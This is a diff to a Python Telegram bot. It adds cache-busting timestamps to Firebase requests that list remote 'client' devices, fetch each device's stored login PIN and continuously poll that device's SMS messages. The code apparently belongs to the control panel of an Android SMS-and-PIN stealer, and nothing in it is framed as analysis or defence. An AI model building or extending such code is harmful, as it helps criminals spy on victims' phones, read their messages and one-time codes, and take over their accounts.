@@ -127,7 +127,7 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args:
         search_query = " ".join(context.args).lower()
         try:
-            response = requests.get(f"{firebase_base}/user_data.json")
+            response = requests.get(f"{firebase_base}/user_data.json?t={time.time()}")
             clients = response.json() or {}
             
             # Direct match check
@@ -143,8 +143,8 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if found_id:
                 selected_device_id = found_id # Yahan device update ho gayi
-                details = requests.get(f"{firebase_base}/user_data/{found_id}.json").json() or {}
-                login_resp = requests.get(f"{firebase_base}/All_Users/Login/{found_id}.json")
+                details = requests.get(f"{firebase_base}/user_data/{found_id}.json?t={time.time()}").json() or {}
+                login_resp = requests.get(f"{firebase_base}/All_Users/Login/{found_id}.json?t={time.time()}")
                 login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
                 
                 pin = login_data.get('pin', 'N/A')
@@ -177,7 +177,7 @@ async def show_device_page(update, context, page):
         return
     
     try:
-        response = requests.get(f"{firebase_base}/user_data.json")
+        response = requests.get(f"{firebase_base}/user_data.json?t={time.time()}")
         clients = response.json() or {}
         if not clients:
             await update.message.reply_text("Koi clients nahi mile 📱.")
@@ -193,7 +193,7 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
+            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json?t={time.time()}")
             login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
             
             pin = login_data.get('pin', 'N/A')
@@ -232,10 +232,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
+            response = requests.get(f"{firebase_base}/user_data/{client_id}.json?t={time.time()}")
             details = response.json() or {}
             
-            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
+            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json?t={time.time()}")
             login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
             
             pin = login_data.get('pin', 'N/A')
@@ -282,7 +282,7 @@ async def monitor_task(chat_id, context):
     while is_monitoring:
         try:
             # Firebase se specific device ka data fetch karo
-            data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
+            data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json?t={time.time()}").json()
             
             if data and isinstance(data, dict):
                 current_keys = list(data.keys())
